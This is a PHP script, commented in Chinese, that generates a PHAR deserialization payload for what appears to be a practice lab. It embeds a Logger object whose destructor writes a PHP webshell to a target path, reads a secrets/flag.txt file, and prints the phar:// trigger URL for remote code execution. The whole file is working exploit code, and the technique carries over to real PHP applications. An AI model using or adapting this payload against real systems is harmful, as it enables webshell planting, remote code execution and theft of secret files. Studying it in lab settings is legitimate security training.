<?php
/**
 * =============================================================================
 *  gen_phar_lab.php — 生成 PHAR 靶場的攻擊 payload
 * =============================================================================
 *
 *  生成一個 PHAR 檔案，其 metadata 是 Logger 物件：
 *    • logFile = 目標 webshell 的絕對路徑
 *    • exitMsg = PHP webshell 內容
 *
 *  當伺服器呼叫 md5_file("phar://...") 時觸發反序列化 → Logger::__destruct()
 *  → 把 exitMsg 寫入 logFile → webshell 產生 → RCE
 *
 *  用法：
 *    php -d phar.readonly=0 gen_phar_lab.php <目標路徑>
 * =============================================================================
 */

// 與 pharlab.php 中完全相同的類別定義（PHAR metadata 需要一致的類別名）
class Logger {
    public $logFile;
    public $initMsg;
    public $exitMsg;
    function __construct($file = '') {
        $this->logFile = $file;
        $this->initMsg = "#start\n";
        $this->exitMsg = "#end\n";
    }
}

$target = $argv[1] ?? (__DIR__ . '/upload/shell.php');

$l = new Logger($target);
$l->exitMsg = '<?php echo "PHAR_RCE_OK\n"; echo file_get_contents(__DIR__ . "/../secrets/flag.txt"); ?>';

@unlink(__DIR__ . '/payload.phar');
$phar = new Phar(__DIR__ . '/payload.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($l);
$phar->stopBuffering();

echo "PHAR: " . __DIR__ . "/payload.phar\n";
echo "大小: " . filesize(__DIR__ . '/payload.phar') . " bytes\n";
echo "目標: $target\n";
echo "觸發: /check?f=phar://" . __DIR__ . "/payload.phar/test.txt\n";
